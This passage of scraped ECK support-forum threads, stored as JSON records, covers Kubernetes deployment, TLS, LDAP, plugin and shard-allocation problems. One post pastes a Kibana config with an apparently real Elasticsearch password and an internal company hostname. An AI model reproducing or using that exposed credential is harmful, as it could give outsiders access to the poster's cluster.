    "title": "How can I remove the es-default service installed by cloud-on-k8s",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Jone",
    "date": "January 9, 2020, 7:32am January 9, 2020, 1:16pm",
    "body": "How can I remove the es-default service installed by cloud-on-k8s, or add port to the es-default service?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f00c8451-cc29-44df-a9ee-30c26c9e1830",
    "url": "https://discuss.elastic.co/t/transport-profiles-with-es-7-5-0/214407",
    "title": "Transport profiles with ES 7.5.0",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "akappler",
    "date": "January 9, 2020, 10:09am January 9, 2020, 11:12am",
    "body": "Hi, we configured ES 6.8.3 with a transport profile without mutual TLS authentication for use with a legacy client. Now we want to upgrade to ES 7.5.0, but the same configuration stopped working. Apparently no server certificate is generated, and the TLS handshake fails. Here is the configuration: transport.profiles.client: port: 9500 xpack.security: type: client ssl: client_authentication: none And here is the output of openssl when trying to connect to the transport profile: openssl s_client -connect localhost:9500 Do 09 Jan 2020 11:09:18 CET CONNECTED(00000003) 140007703086336:error:14094410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:ssl/record/rec_layer_s3.c:1543:SSL alert number 40 --- no peer certificate available --- No client certificate CA names sent --- SSL handshake has read 7 bytes and written 293 bytes Verification: OK --- New, (NONE), Cipher is (NONE) Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 0 (ok) ---",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5c8615f6-6ec8-4ab1-afb7-489c4c11c62e",
    "url": "https://discuss.elastic.co/t/can-the-elastic-stack-run-on-the-kubernetes-1-10/213970",
    "title": "Can the Elastic stack run on the Kubernetes: 1.10?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ted_ye",
    "date": "January 7, 2020, 3:32am January 7, 2020, 8:36am January 7, 2020, 9:03am",
    "body": "Hello, Can the Elastic stack run on the Kubernetes: 1.10 ? why the Kubernetes need version 1.11+? thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ef3ffb32-36d5-41f3-8f9b-ffcf7f9b4e83",
    "url": "https://discuss.elastic.co/t/elasticsearch-upgrade-stuck-skipping-deletion-because-of-migrating/213568",
    "title": "Elasticsearch upgrade stuck - Skipping deletion because of migrating",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pabloborh",
    "date": "January 2, 2020, 12:28pm January 2, 2020, 4:48pm January 3, 2020, 7:26am January 3, 2020, 2:04pm January 7, 2020, 8:39am",
    "body": "Hello, I've modified request, limits and xms xmx Java options of my cluster yaml. The upgrade is stuck and operators logs are {\"level\":\"info\",\"ts\":1577967197.4311237,\"logger\":\"elasticsearch-controller\",\"msg\":\"Updating status\",\"iteration\":5457,\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967197.4311762,\"logger\":\"generic-reconciler\",\"msg\":\"Aggregated reconciliation results complete\",\"result\":{\"Requeue\":true,\"RequeueAfter\":10000000000}} {\"level\":\"info\",\"ts\":1577967197.4311981,\"logger\":\"elasticsearch-controller\",\"msg\":\"End reconcile iteration\",\"iteration\":5457,\"took\":0.784774123,\"namespace\":\"elasticsearch\",\"es_ame\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967207.4313903,\"logger\":\"elasticsearch-controller\",\"msg\":\"Start reconcile iteration\",\"iteration\":5458,\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967207.4348965,\"logger\":\"transport\",\"msg\":\"Reconciling transport certificate secrets\",\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967208.1634543,\"logger\":\"driver\",\"msg\":\"Calculated all required changes\",\"to_create:\":5,\"to_keep:\":4,\"to_delete:\":6,\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967208.1636055,\"logger\":\"driver\",\"msg\":\"Calculated performable changes\",\"schedule_for_creation_count\":0,\"schedule_for_deletion_count\":1,\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} {\"level\":\"info\",\"ts\":1577967208.2052684,\"logger\":\"driver\",\"msg\":\"Skipping deletion because of migrating data\",\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\",\"pod_name\":\"elasticsearch-es-data-sx54vph58q\"} {\"level\":\"info\",\"ts\":1577967208.2053738,\"logger\":\"elasticsearch-controller\",\"msg\":\"Updating status\",\"iteration\":5458,\"namespace\":\"elasticsearch\",\"es_name\":\"elasticsearch\"} I don't know what means \"Skipping deletion because of migrating\" Cluster previous state was yellow, because of one data node was \"evicted\" because of request threshold Operators image is: docker.elastic.co/eck/eck-operator:0.9.0",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7bcfbefa-0807-42d8-8f3e-1bb1e5597e6c",
    "url": "https://discuss.elastic.co/t/ldap-needs-a-license-for-use/213536",
    "title": "LDAP needs a license for use",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JuYeong_Park",
    "date": "January 2, 2020, 8:45am January 2, 2020, 9:17am January 2, 2020, 11:54am",
    "body": "When i try to use ldap in elastic cloud on k8s according to guide(https://github.com/elastic/cloud-on-k8s/issues/40#issuecomment-565412446), they returned to me below message. version 6.8 [2020-01-02T07:55:27,091][WARN ][o.e.x.s.a.AuthenticationService] [master-1] Authentication failed using realms [reserved/reserved,file/file1]. Realms [ldap/ldap1] were skipped because they are not permitted on the current license version 7.2 {\"type\": \"server\", \"timestamp\": \"2020-01-02T08:09:21,612+0000\", \"level\": \"WARN\", \"component\": \"o.e.x.s.a.AuthenticationService\", \"cluster.name\": \"cluster-name\", \"node.name\": \"master-name\", \"cluster.uuid\": \"L8Xl5EMGT9qtE_oUIRifwQ\", \"node.id\": \"dtGj32qpS7WG227FO9aiKw\", \"message\": \"Authentication failed using realms [reserved/reserved,file/file1]. Realms [ldap/ldap1] were skipped because they are not permitted on the current license\" } So, I want to know that there are any method to use ldap in elastic cloud on k8s. Here is my yaml file for ldap setting. apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: jay-p-es spec: http: tls: selfSignedCertificate: disabled: True version: 7.2.0 nodeSets: - name: master count: 3 config: node.master: true node.data: false node.ingest: false xpack.security.authc.realms: ldap: ldap1: order: 0 url: \"ldap://hostname:389\" bind_dn: \"bind_dn\" user_search: base_dn: \"base_dn\" filter: \"(uid={0})\" group_search: base_dn: \"base_dn\" unmapped_groups_as_roles: false bind_password: \"password\" podTemplate: spec: hostNetwork: true volumes: - name: elasticsearch-data emptyDir: {} containers: - name: elasticsearch resources: requests: memory: 7Gi cpu: 7 limits: memory: 7Gi cpu: 7 - name: data count: 3 config: node.master: false node.data: true node.ingest: true xpack.security.authc.realms: ldap: ldap1: order: 0 url: \"ldap://hostname:389\" bind_dn: \"bind_dn\" user_search: base_dn: \"base_dn\" filter: \"(uid={0})\" group_search: base_dn: \"base_dn\" unmapped_groups_as_roles: false bind_password: \"password\" podTemplate: spec: hostNetwork: true volumes: - name: elasticsearch-data emptyDir: {} containers: - name: elasticsearch resources: requests: memory: 7Gi cpu: 7 limits: memory: 7Gi cpu: 7",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "14628ec2-a844-4ac1-8f15-52844ce634a1",
    "url": "https://discuss.elastic.co/t/pod-status-stuck-at-terminating-when-k8s-node-not-ready/212907",
    "title": "Pod status stuck at Terminating when k8s node not ready",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LoadingZhang",
    "date": "December 24, 2019, 3:26am December 26, 2019, 7:36am December 26, 2019, 8:17am",
    "body": "I try to simulate k8s environment fault to test eck operator self-healing ability, like stop kubelet or shutdown node. But es pod will stuck at Terminating status when node goes down, is it by desgin? And is there solution to solve k8s node fault by itself? I know it's hard to handle, we can solve a part of at first. Such as when the k8s nodes get failure and es nodes left cluster, operator try to schedul pod to other k8s node adter few minutes.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "662cff06-1f89-4c53-9cc0-40258386ae25",
    "url": "https://discuss.elastic.co/t/init-container-fails/193684",
    "title": "Init container fails",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ransoor",
    "date": "August 4, 2019, 2:20pm August 5, 2019, 7:55am August 5, 2019, 6:05pm August 6, 2019, 9:04am August 7, 2019, 12:50pm December 20, 2019, 4:52pm December 20, 2019, 5:08pm December 23, 2019, 2:25pm December 25, 2019, 3:39pm",
    "body": "I followed the quickstart guide version 0.9. I applied the elastic operator CRD. I deployed the elastic cluster with one node, but its status is Init:CrashLoopBackOff. After some debugging, I found that the init container elastic-internal-init-filesystem fails, specifically in the script prepare-fs.sh: \"chowning /usr/share/elasticsearch/data to elasticsearch:elasticsearch chown: changing ownership of '/usr/share/elasticsearch/data': Operation not permitted\" The chown command is being run by root. Am I missing anything?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "c8d07f4c-95b1-4ad3-8dad-a73aef37d71c",
    "url": "https://discuss.elastic.co/t/credentials-for-elastic-operator/212628",
    "title": "Credentials for elastic-operator",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "December 20, 2019, 8:39am December 20, 2019, 10:34am December 20, 2019, 2:28pm December 20, 2019, 4:19pm December 20, 2019, 5:46pm December 22, 2019, 2:40pm December 23, 2019, 7:59am December 23, 2019, 9:22am December 23, 2019, 1:52pm December 23, 2019, 1:57pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "c7015c8c-cd50-4e44-a6cc-e7f32a5245b8",
    "url": "https://discuss.elastic.co/t/init-container-mount-problem-in-eck/212382",
    "title": "Init container mount problem in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "December 18, 2019, 6:28pm December 19, 2019, 11:10am December 20, 2019, 8:59am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3428dc5c-72b5-4146-9900-5a9a84ceb94c",
    "url": "https://discuss.elastic.co/t/apm-on-eck-overwriting-kubernetes-secret-token/211729",
    "title": "APM on ECK overwriting kubernetes secret token",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Andrew_Nichols",
    "date": "December 12, 2019, 9:58pm December 16, 2019, 9:04am December 16, 2019, 10:41pm",
    "body": "We recently added APM to our ECK cluster andrew we're running into an issue. If we remove APM and re-add it the operator will overwrite any existing apm-token set. I would assume it worked like the es-elastic-user secret and just use it if it exists and not overwrite the value. Is this how it's supposed to work? Thanks, Andrew",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "18a55476-bb90-478a-907d-5debfc11cb86",
    "url": "https://discuss.elastic.co/t/fails-to-deploy-es-on-kubernetes/211499",
    "title": "Fails to deploy ES on Kubernetes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "nobound",
    "date": "December 11, 2019, 4:36pm December 16, 2019, 9:20am December 16, 2019, 4:30pm",
    "body": "Hi, I am using the elasticsearch helm chart (https://github.com/elastic/helm-charts/tree/master/elasticsearch) to deploy to Kubernetes cluster. It fails to come up properly. I think it is due to the health check (via http) with its hostname. I am just wondering if anyone has seen the same issue. Not sure how to debug the issue. When I run \"kubectl describe pods ...\" ....... Containers: test-es-master-vcqdc-test: Container ID: docker://28b6383270b600ef103edd7d1a83b35374fd8fe80d5aba9a673c029a0e86571c Image: docker.elastic.co/elasticsearch/elasticsearch:7.4.0 Image ID: docker-pullable://docker.elastic.co/elasticsearch/elasticsearch@sha256:ccacb1463adc6daee970ed45e34cc46c14ba22116b64d5d4fac58044dfd61e8c Port: <none> Host Port: <none> Command: sh -c #!/usr/bin/env bash -e curl -XGET --fail 'test-es-master:9200/_cluster/health?wait_for_status=green&timeout=60s' State: Terminated Reason: Error Exit Code: 7 Started: Thu, 21 Nov 2019 12:36:16 -0500 Finished: Thu, 21 Nov 2019 12:36:19 -0500 Ready: False Restart Count: 0 Environment: <none> Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-tg24t (ro)",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "17d81d6e-e78c-4d16-b3d2-3cb92241f341",
    "url": "https://discuss.elastic.co/t/elastic-7-5-s3-plugin-install-warning-message/211875",
    "title": "Elastic 7.5 S3 plugin install warning message",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sfgroups1",
    "date": "December 14, 2019, 5:06pm December 16, 2019, 8:24am December 16, 2019, 3:15pm",
    "body": "on my 7.5 cluster when install s3 plugin its giving below warning. Any idea what permission needed for java # bin/elasticsearch-plugin install repository-s3 -> Downloading repository-s3 from elastic [=================================================] 100%?? @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: plugin requires additional permissions @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ * java.lang.RuntimePermission accessDeclaredMembers * java.lang.RuntimePermission getClassLoader * java.lang.reflect.ReflectPermission suppressAccessChecks * java.net.SocketPermission * connect,resolve * java.util.PropertyPermission es.allow_insecure_settings read,write See http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html for descriptions of what these permissions allow and the associated risks. Continue with installation? [y/N]y -> Installed repository-s3",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3cdd44d0-a412-46e3-9f43-e5af05bf1743",
    "url": "https://discuss.elastic.co/t/gcs-snapshots-suddenly-failing-in-eck/210949",
    "title": "GCS Snapshots suddenly failing in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "December 7, 2019, 3:58am March 2, 2020, 10:09am",
    "body": "Hello Elastic Wizards! I'm on ECK 0.8 at the moment, and I have been using the snapshot functionality on GCP quite successfully, with no issues for a long time. I followed these instructions and it has been working quite well. I literally have not touched the cluster in forever. I went to check on my snapshots, and I now notice that since a few weeks ago, I get partial shard failures . 2pGEVje.png1190×582 76.3 KB Nothing changed in the cluster state during this time. I've gone over elastic logs for those days, nothing was upgraded or added. The errors look like this: Y9x3xMm.png534×747 41.9 KB If there were an error accessing the bucket, you would think that all of the indices would fail. Am I missing something obvious here? Thanks for reading, --Tadgh",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8b6e4cb7-489b-43ea-be50-b444842d2c5b",
    "url": "https://discuss.elastic.co/t/unable-to-import-kibana-dashboard/210605",
    "title": "Unable to import kibana dashboard",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "jdambly",
    "date": "December 4, 2019, 11:11pm December 10, 2019, 10:05pm December 10, 2019, 10:21pm",
    "body": "I am trying to import a 1.3mb bashoard and am getting the following error Screen Shot 2019-12-04 at 3.03.12 PM.png796×798 32.7 KB I set server.maxPayloadBytes to 8388608, here is my kibana manifest apiVersion: kibana.k8s.elastic.co/v1beta1 kind: Kibana metadata: name: kibana spec: version: 7.4.1 count: 1 elasticsearchRef: name: \"elastic\" config: server.maxPayloadBytes: 8388608 http: service: metadata: annotations: external-dns.alpha.kubernetes.io/hostname: kibana.prime.iad0.netskope.com spec: type: LoadBalancer # default is ClusterIP tls: selfSignedCertificate: disabled: true podTemplate: spec: volumes: - name: kibana-plugins emptyDir: {} - name: logtrail-configs configMap: name: log-trail containers: - name: kibana resources: limits: memory: 4Gi volumeMounts: - name: kibana-plugins mountPath: /usr/share/kibana/plugins - name: logtrail-configs mountPath: /usr/share/kibana/plugins/logtrail/logtrail.json subPath: logtrail.json initContainers: - name: install-plugins image: docker.elastic.co/kibana/kibana:7.4.1 command: - sh - -c - bin/kibana-plugin install https://github.com/sivasamyk/logtrail/releases/download/v0.1.31/logtrail-7.4.1-0.1.31.zip volumeMounts: - name: kibana-plugins mountPath: /usr/share/kibana/plugins what I think is odd is that once the pod spawns the value for maxPayLoadBytes seems to have been munged? is this perhaps what is causing my issue? it's set to maxPayloadBytes: 8.388608e+06 is this right? kubectl exec -it kibana-kb-b865c898b-mzb72 -- cat config/kibana.yml elasticsearch: hosts: http://elastic-es-http.logging.svc:9200 password: fgbvvrhw2xz2mh9smkmkl5qq ssl: certificateAuthorities: /usr/share/kibana/config/elasticsearch-certs/ca.crt verificationMode: certificate username: logging-kibana-kibana-user server: host: \"0\" maxPayloadBytes: 8.388608e+06 name: kibana xpack: monitoring: ui: container: elasticsearch: enabled: true",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7e69c451-eed7-4f90-9cd5-e98e878b77ab",
    "url": "https://discuss.elastic.co/t/eck-1-0-0-beta1-during-node-startup-pod-goes-to-crashloopbackoff/211154",
    "title": "ECK 1.0.0-beta1 during node startup pod goes to CrashLoopBackOff",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sfgroups1",
    "date": "December 9, 2019, 4:12pm December 9, 2019, 5:01pm December 9, 2019, 10:57pm December 10, 2019, 10:15am December 10, 2019, 1:46pm December 10, 2019, 2:01pm December 10, 2019, 7:53pm",
    "body": "Hi, i have 6 node ECK cluster, when ever node reboots elastic 7.5 pod is not starting it goes in 'crashloop node'. If I delete the pod, then its starting properly. I am un shure why POD goes into crashloop. # kgpw -w NAME READY STATUS RESTARTS AGE elastic-operator-0 1/1 Running 8 2d22h elk-prd-es-default-0 1/1 Running 0 22h elk-prd-es-default-1 1/1 Running 0 2d16h elk-prd-es-default-2 1/1 Running 0 2d16h elk-prd-es-default-3 1/1 Running 0 17s elk-prd-es-default-4 0/1 Init:CrashLoopBackOff 9 22h elk-prd-es-default-4 0/1 Init:1/3 10 22h elk-prd-es-default-4 0/1 Init:Error 10 22h elk-prd-es-default-4 0/1 Init:CrashLoopBackOff 10 22h Here is the events: Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning BackOff 21m (x5767 over 21h) kubelet, ecknode04 Back-off restarting failed container Normal SandboxChanged 17m kubelet, ecknode04 Pod sandbox changed, it will be killed and re-created. Normal Pulled 17m kubelet, ecknode04 Container image \"docker.elastic.co/elasticsearch/elasticsearch:7.5.0\" already present on machine Normal Created 17m kubelet, ecknode04 Created container elastic-internal-init-filesystem Normal Started 17m kubelet, ecknode04 Started container elastic-internal-init-filesystem Normal Pulled 17m (x4 over 17m) kubelet, ecknode04 Container image \"docker.elastic.co/elasticsearch/elasticsearch:7.5.0\" already present on machine Normal Created 17m (x4 over 17m) kubelet, ecknode04 Created container elastic-internal-init-keystore Normal Started 17m (x4 over 17m) kubelet, ecknode04 Started container elastic-internal-init-keystore Warning BackOff 2m50s (x77 over 17m) kubelet, ecknode04 Back-off restarting failed container any help to resolve this issue?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d2c53255-cc73-4df1-bb1d-e9752f0dceab",
    "url": "https://discuss.elastic.co/t/ingress-for-kibana-in-eck/211163",
    "title": "Ingress for Kibana in ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "francesc.recasens",
    "date": "December 9, 2019, 5:10pm December 10, 2019, 9:31am",
    "body": "Good afternoon, I'm trying to deploy an Elasticsearch cluster (v1.16.3) using ECK on premise. I'm using OpenEBS for StorageClass. I created a one-node Elasticsearch cluster and also a Kibana, so I can test if it's working or not. When I create the Ingress, I'm always having a HTTP 502 error. I'm using nginxinc/kubernetes-ingress and I tried different solutions (#942). It is also identified here and here. This is the YAML I'm using: apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: elastic-lm spec: version: 7.5.0 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false apiVersion: kibana.k8s.elastic.co/v1beta1 kind: Kibana metadata: name: kibana-lm spec: version: 7.5.0 http: service: spec: type: ClusterIP count: 1 elasticsearchRef: name: elastic-lm apiVersion: extensions/v1beta1 kind: Ingress metadata: name: kibana-lm-ingress namespace: default spec: tls: - hosts: - kibana.example.com rules: - host: kibana.example.com http: paths: - path: / backend: serviceName: kibana-lm-kb-http servicePort: 5601 Thank you so much,",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5e506c0f-a2c6-4cb7-8f84-eff80728b107",
    "url": "https://discuss.elastic.co/t/use-s3-elastic-plugins/211214",
    "title": "Use S3 elastic plugins",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pingz",
    "date": "December 10, 2019, 6:18am",
    "body": "Hi: I installed elastic operator to install elastic search and kibana in AWS EKS. I would like to register a S3 Repository for taking snapshot. How do I get the repository-s3 plugin added to the elastic search image? I used kubectl exec -it quickstart-es-default-0 /bin/bash and noticed the plugins directory is empty. Elastic 7.5.0 image is in use. Found the document myself now. https://www.elastic.co/guide/en/cloud-on-k8s/master/k8s-init-containers-plugin-downloads.html",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "856a6d9b-5f75-4c9a-b524-a09b0d2be388",
    "url": "https://discuss.elastic.co/t/filebeat-and-metricbeat-as-daemonset-with-eck/210935",
    "title": "Filebeat and metricbeat as daemonset with eck",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ikaposi",
    "date": "December 6, 2019, 7:16pm December 6, 2019, 7:32pm December 6, 2019, 7:54pm",
    "body": "Hi, I've deployed an eck elastic cluster and now I'd like to enable the metricbeat and filebeat daemonsets. The daemonsets are however complaining the x509 certificate is not trusted. I'd prefer to somehow reference the CA utilizing the already defined secrets by ECK, but I could use some help with that. I'm not quite sure what the best approach is here. Anybody already got this working?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0860e333-c9d4-4eaa-a09a-2bb3ee605e83",
    "url": "https://discuss.elastic.co/t/feature-change-default-docker-registry-in-operator-command-line-flags/210801",
    "title": "[feature] Change default docker registry in operator command line flags",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LoadingZhang",
    "date": "December 6, 2019, 2:06am December 6, 2019, 8:57am December 6, 2019, 10:32am",
    "body": "I can not download docker images from docker.elastic.co in private network eviroment. So if we could set operator command line flags such as: --default-registry=xxx.xxx.xxx, it would be more convenience to use eck where network can not access internet.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b630ba1b-c4dd-4d6d-9b0f-3ccbd19b9a51",
    "url": "https://discuss.elastic.co/t/how-to-assign-nodeselector-to-kibana/210636",
    "title": "How to assign nodeSelector to Kibana",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LoadingZhang",
    "date": "December 5, 2019, 7:50am December 5, 2019, 8:06am December 5, 2019, 8:55am",
    "body": "I try to add spec: version: 7.5.0 count: 1 nodeSelector: appType: stateless but it didn't work.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "44eeb4df-f831-401f-a209-69c735dca95e",
    "url": "https://discuss.elastic.co/t/specify-known-password-for-the-elasticsearch-user/210239",
    "title": "Specify known password for the elasticsearch user",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "trondhindenes",
    "date": "December 2, 2019, 8:22pm December 2, 2019, 11:55pm December 4, 2019, 7:21am",
    "body": "As far as I understand, ECK will generate a password and place it in a secrets file. This doesn't suit our workflow, we want to provide known values for all things upfront, including the elastic user password. Is there a way to provide it instead of having it auto-generated? As far as I can see, the documentation at least doesn't mention it.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "357d0343-a91c-42c6-8678-71391b51ea81",
    "url": "https://discuss.elastic.co/t/kibana-no-longer-working/208399",
    "title": "Kibana no longer working",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "getorca",
    "date": "November 18, 2019, 11:12pm November 19, 2019, 10:19am November 19, 2019, 6:44pm November 21, 2019, 6:13pm November 22, 2019, 10:47pm November 23, 2019, 6:31am November 25, 2019, 8:44am November 25, 2019, 8:35pm November 26, 2019, 9:23am November 26, 2019, 6:03pm November 26, 2019, 6:15pm November 27, 2019, 8:46am December 3, 2019, 8:10pm December 3, 2019, 8:51pm",
    "body": "As of a few hours ago, Kibana is no longer working. it crashed suddenly and no the pod for Kibana is failing to achieve a Ready state. The ES pods are still working fine. The most obvious errors from the kibana pods seem to relate to getting a licence from Elasticsearch for xpack: {\"type\":\"log\",\"@timestamp\":\"2019-11-18T23:08:21Z\",\"tags\":[\"warning\",\"task_manager\"],\"pid\":1,\"message\":\"PollError Request Timeout after 30000ms\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-18T23:08:40Z\",\"tags\":[\"license\",\"warning\",\"xpack\"],\"pid\":1,\"message\":\"License information from the X-Pack plugin could not be obtained from Elasticsearch for the [data] cluster. Error: Request Timeout after 30000ms\"} ES version: 7.2 Kubernetes version: v1alpha1 I'm not sure why this would occur suddenly. Any ideas to diagnose?",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "393b130a-6c27-4788-b991-641f585061af",
    "url": "https://discuss.elastic.co/t/fresh-cluster-all-shards-are-unavailable/210216",
    "title": "Fresh cluster all shards are unavailable",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dg_hivebrite",
    "date": "December 2, 2019, 4:31pm December 2, 2019, 7:01pm December 3, 2019, 8:06am December 3, 2019, 10:38am December 3, 2019, 10:47am December 3, 2019, 11:02am December 3, 2019, 12:13pm December 3, 2019, 1:28pm December 3, 2019, 1:43pm December 3, 2019, 2:34pm",
    "body": "Hi, When my cluster is started, his status is in yellow: { \"cluster_name\" : \"datawarehouse\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 6, \"number_of_data_nodes\" : 0, \"active_primary_shards\" : 0, \"active_shards\" : 0, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 9, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 0.0 } Also in parallel I check the kibana logs (because the service can't start), the error is: {\"type\":\"log\",\"@timestamp\":\"2019-12-02T15:58:39Z\",\"tags\":[\"security\",\"error\"],\"pid\":6,\"message\":\"Error registering Kibana Privileges with Elasticsearch for kibana-.kibana: [unavailable_shards_exception] at least one primary shard for the index [.security-7] is unavailable\"} I check my shards: curl -k -u \"elastic:xxxxx\" \"https://datawarehouse-es-http:9200/_c at/shards?h=index,shard,prirep,state,unassigned.reason\" --silent .security-7 0 p UNASSIGNED INDEX_CREATED .kibana_task_manager_1 0 p UNASSIGNED INDEX_CREATED .kibana_task_manager_1 0 r UNASSIGNED INDEX_CREATED .kibana_1 0 p UNASSIGNED INDEX_CREATED .kibana_1 0 r UNASSIGNED INDEX_CREATED .apm-agent-configuration 0 p UNASSIGNED INDEX_CREATED .apm-agent-configuration 0 r UNASSIGNED INDEX_CREATED Then I check the cluster allocation: curl -k -u \"elastic:xxxxx\" \"https://datawarehouse-es-http:9200/_c luster/allocation/explain?pretty\" { \"index\" : \".kibana_1\", \"shard\" : 0, \"primary\" : true, \"current_state\" : \"unassigned\", \"unassigned_info\" : { \"reason\" : \"INDEX_CREATED\", \"at\" : \"2019-12-02T15:34:31.969Z\", \"last_allocation_status\" : \"no_attempt\" }, \"can_allocate\" : \"no\", \"allocate_explanation\" : \"cannot allocate because allocation is not permitted to any of the nodes\" } Also I found this error in the elasticsearch logs: org.elasticsearch.action.UnavailableShardsException: at least one primary shard for the index [.security-7] is unavailable I check the cluster settings: curl -k -u \"elastic:xxxxx\" https://datawarehouse-es-http:9200/_cl uster/settings?pretty { \"persistent\" : { }, \"transient\" : { \"cluster\" : { \"routing\" : { \"allocation\" : { \"exclude\" : { \"_name\" : \"none_excluded\" } } } } } } ECK version: 1.0.0-beta elasticsearch version: 7.4.2 elasticsearch config: https://gist.github.com/Dudesons/f4af00f15790175e3f360577b8f04f15 (it's the config of 1 nodes) cluster: 3 master & 3 data nodes I tried to boot a new cluster, the problem persists If someone can help me to understand / fix the issue it would be awesome.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "260081ce-a9f9-4495-b968-90b58f8280d1",
    "url": "https://discuss.elastic.co/t/eck-and-es-on-eks-1-12-installation-setup-issue/206401",
    "title": "ECK and ES on EKS 1.12 installation / setup issue",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sathia.thayathil",
    "date": "November 4, 2019, 12:34pm December 2, 2019, 10:47am",
    "body": "{\"type\": \"server\", \"timestamp\": \"2019-11-04T12:12:27,916Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"elastic\", \"node.name\": \"elastic-es-default-0\", \"message\": \"master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster, and [cluster.initial_master_nodes] is empty on this node: have discovered [{elastic-es-default-0}{R6HYNNymSF-jhqz5y3EJuQ}{kWMPQe05TUmH9jii7PVzcA}{10.32.0.32}{10.32.0.32:9300}{dilm}{ml.machine_memory=4294967296, xpack.installed=true, ml.max_open_jobs=20}]; discovery will continue using [127.0.0.1:9300, 127.0.0.1:9301, 127.0.0.1:9302, 127.0.0.1:9303, 127.0.0.1:9304, 127.0.0.1:9305] from hosts providers and [{elastic-es-default-0}{R6HYNNymSF-jhqz5y3EJuQ}{kWMPQe05TUmH9jii7PVzcA}{10.32.0.32}{10.32.0.32:9300}{dilm}{ml.machine_memory=4294967296, xpack.installed=true, ml.max_open_jobs=20}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" } {\"type\": 